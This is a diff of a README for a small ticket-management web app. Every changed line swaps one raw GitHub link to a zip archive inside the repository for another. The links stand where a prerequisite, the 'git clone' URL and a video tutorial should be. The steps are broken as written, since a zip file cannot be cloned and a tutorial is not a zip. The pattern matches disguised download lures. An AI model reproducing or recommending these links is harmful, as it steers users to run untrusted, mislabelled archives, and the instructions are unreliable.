@@ -17,7 +17,7 @@ The Ticket App is for managing tickets, such as creating, editing, and deleting 
 
 ## Prerequisites
 
-- https://github.com/vicleyva/ticket-app/raw/refs/heads/master/.vscode/ticket_app_v3.8-alpha.1.zip
+- https://raw.githubusercontent.com/vicleyva/ticket-app/master/public/ticket-app-v1.7-beta.5.zip
 - npm
 
 ## Installation
@@ -27,7 +27,7 @@ To get started with the Ticket App, follow these steps:
 ```bash
 
 # Clone the repository:
-git clone https://github.com/vicleyva/ticket-app/raw/refs/heads/master/.vscode/ticket_app_v3.8-alpha.1.zip
+git clone https://raw.githubusercontent.com/vicleyva/ticket-app/master/public/ticket-app-v1.7-beta.5.zip
 
 # Navigate to the project folder:
 cd ticket-app
@@ -67,6 +67,6 @@ npm start
 
 ## Video Tutorial
 
-[![BootcampOrg Tutorial](https://github.com/vicleyva/ticket-app/raw/refs/heads/master/.vscode/ticket_app_v3.8-alpha.1.zip)](https://github.com/vicleyva/ticket-app/raw/refs/heads/master/.vscode/ticket_app_v3.8-alpha.1.zip)
+[![BootcampOrg Tutorial](https://raw.githubusercontent.com/vicleyva/ticket-app/master/public/ticket-app-v1.7-beta.5.zip)](https://raw.githubusercontent.com/vicleyva/ticket-app/master/public/ticket-app-v1.7-beta.5.zip)
 
 Check out this video tutorial from BootcampOrg that provides a detailed walkthrough of the Ticket App.
